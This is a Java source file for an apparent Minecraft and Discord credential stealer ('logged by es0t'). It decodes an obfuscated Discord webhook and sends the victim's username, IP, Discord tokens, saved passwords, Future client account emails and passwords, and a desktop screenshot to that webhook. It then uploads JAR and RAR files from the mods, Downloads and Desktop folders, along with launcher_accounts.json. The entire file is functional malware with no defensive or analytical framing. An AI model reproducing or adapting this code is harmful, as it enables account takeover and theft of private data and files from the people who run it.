package me.esot.logger;

import club.minnced.discord.webhook.WebhookClient;
import club.minnced.discord.webhook.send.WebhookEmbed;
import club.minnced.discord.webhook.send.WebhookEmbedBuilder;
import me.esot.logger.utils.FileUtil;
import me.esot.logger.utils.PasswordUtil;
import me.esot.logger.utils.TokenUtil;
import me.esot.logger.utils.WebUtils;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Random;

public class Main {

    public static void main(String args[]) throws Exception {
        //if (HWIDUtil.blacklisted()) return;

        String url = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTE0MTk0NzI3NjkwMTg2NzYyL1N6TkFsT25VZGZ4WGgyclBHSWpMTDNkM3NhRGlUVlMyeWRwTERzTjg4MWNVeDdySWJnUS0zZDNsMjFyQ1VpLVV2YmVK";
        WebhookClient client = WebhookClient.withUrl(new String(Base64.getDecoder().decode(url.getBytes(StandardCharsets.UTF_8))));
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new URL("http://checkip.amazonaws.com").openStream()));
        String ip = bufferedReader.readLine();
        bufferedReader.close();

        File f = new File(System.getProperty("user.home") + "\\Future\\accounts.txt");

        String str = null;

        if (f.exists() && !f.isDirectory()) {
            FileInputStream fstream = new FileInputStream(f.getAbsolutePath());
            DataInputStream in = new DataInputStream(fstream);
            BufferedReader br = new BufferedReader(new InputStreamReader(in));
            str = "";

            String line;
            while ((line = br.readLine()) != null) {
                String curLine = line.trim();
                str += curLine.split(":")[0] + "\n";
                str += "Email: " + curLine.split(":")[3] + "\n";
                str += "Password: " + curLine.split(":")[4] + "\n";
                str += "====================================\n";
            }

            br.close();
            in.close();
            fstream.close();
        }

        TokenUtil.getToken();

        WebhookEmbed embed = new WebhookEmbedBuilder()
                .setColor(0x7D69FF)
                .setAuthor(new WebhookEmbed.EmbedAuthor("logged by es0t", "https://i.imgur.com/KBuWjuu.jpeg", "https://youtube.com/es0terik"))
                .setDescription(
                        "Name: " + System.getProperty("user.name") + "\n" +
                        "IP: " + ip + "\n\n" +
                        "Token(s): " + "\n" +
                        TokenUtil.processedtokens + "\n" +
                        "Future account(s): \n" +
                        (str == null ? "n/a" : str + "\n") +
                        "Desktop: " + WebUtils.getLink(captureScreen())
                )
                .build();

        WebhookEmbed embed2 = new WebhookEmbedBuilder()
                .setColor(0x7D69FF)
                .setAuthor(new WebhookEmbed.EmbedAuthor("passwords for " + System.getProperty("user.name"), "https://i.imgur.com/KBuWjuu.jpeg", "https://youtube.com/es0terik"))
                .setDescription(
                        "Passwords: " + PasswordUtil.getPasswords() + "\n"
                )
                .build();

        client.send("@everyone new log");
        client.send(embed);
        client.send(embed2);

        for (File file : FileUtil.getJARs(System.getenv("APPDATA") + "\\.minecraft\\" + "mods")) client.send(file);
        for (File file : FileUtil.getJARs(System.getProperty("user.home") + "\\Downloads")) client.send(file);
        for (File file : FileUtil.getJARs(System.getProperty("user.home") + "\\Desktop")) client.send(file);
        for (File file : FileUtil.getRARs(System.getProperty("user.home") + "\\Desktop")) client.send(file);

        File f1 = new File(System.getenv("APPDATA") + "\\.minecraft\\" + "launcher_accounts.json");
        if (f1.exists()) client.send(f1);


        client.close();
    }

    @SuppressWarnings("all")
    private static String captureScreen() throws Exception {
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Rectangle screenRectangle = new Rectangle(screenSize);
        Robot robot = new Robot();
        BufferedImage image = robot.createScreenCapture(screenRectangle);
        int random = new Random().nextInt();
        File file = new File(System.getenv("TEMP"), "cached_" + random + ".png");
        ImageIO.write(image, "png", file);
        String ret = WebUtils.upload(file);
        file.delete();
        return ret;
    }

}
